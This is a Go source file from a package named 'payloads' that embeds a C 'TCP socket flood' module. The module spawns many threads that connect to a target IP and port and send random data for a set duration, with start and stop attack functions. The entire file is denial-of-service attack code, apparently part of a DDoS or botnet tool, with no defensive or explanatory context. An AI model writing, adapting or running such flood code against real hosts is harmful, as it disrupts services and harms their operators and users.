package payloads

var TCPSocket = `
// ==================== TCP SOCKET FLOOD MODULE ====================
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <fcntl.h>

static int tcp_socket_running = 0;
static pthread_t tcp_socket_threads[100];

void send_traffic(int fd, int length, char *payload, int random_data) {
    if (random_data) {
        for (int i = 0; i < length; i++) {
            payload[i] = rand() % 256;
        }
    }
    send(fd, payload, length, MSG_NOSIGNAL);
}

void *tcp_socket_flood(void *arg) {
    char *target_ip = (char *)arg;
    int port = *(int *)((char *)arg + 64);
    int threads = *(int *)((char *)arg + 68);
    int duration = *(int *)((char *)arg + 72);
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(target_ip);
    
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return NULL;
    
    int keepAlive = 1;
    setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &keepAlive, sizeof(keepAlive));
    
    connect(fd, (struct sockaddr *)&addr, sizeof(addr));
    
    char *payload = malloc(1024);
    time_t start = time(NULL);
    
    while (tcp_socket_running && time(NULL) - start < duration) {
        send_traffic(fd, 1024, payload, 1);
        usleep(1000);
    }
    
    free(payload);
    close(fd);
    return NULL;
}

void start_tcp_socket_attack(char *target, int port, int threads, int duration_sec) {
    if (tcp_socket_running) return;
    tcp_socket_running = 1;
    
    char *arg = malloc(128);
    strcpy(arg, target);
    *((int *)(arg + 64)) = port;
    *((int *)(arg + 68)) = threads;
    *((int *)(arg + 72)) = duration_sec;
    
    for (int i = 0; i < threads; i++) {
        pthread_create(&tcp_socket_threads[i], NULL, tcp_socket_flood, arg);
    }
    
    sleep(duration_sec);
    tcp_socket_running = 0;
    for (int i = 0; i < threads; i++) {
        pthread_join(tcp_socket_threads[i], NULL);
    }
    free(arg);
}

void stop_tcp_socket_attack() { tcp_socket_running = 0; }
// ==================== END TCP SOCKET MODULE ====================
`